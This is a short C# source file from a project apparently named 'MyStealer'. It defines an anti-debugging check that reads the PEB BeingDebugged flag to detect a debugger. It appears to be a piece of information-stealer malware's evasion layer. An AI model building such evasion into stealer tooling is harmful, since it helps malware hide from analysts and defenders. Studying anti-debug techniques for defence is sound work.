using static MyStealer.AntiDebug.NativeCalls;

namespace MyStealer.AntiDebug.Check.Debugging
{
    /// <summary>
    /// Use <c>System.Diagnostics.Debugger.IsAttached</c> to detect debugger presence.
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs#L105
    /// </summary>
    public class BeingDebuggedPeb : CheckBase
    {
        public override string Name => "_PEB.BeingDebugged";

        public override bool CheckActive()
            => _PEB.ParsePeb().BeingDebugged != 0;
    }
}
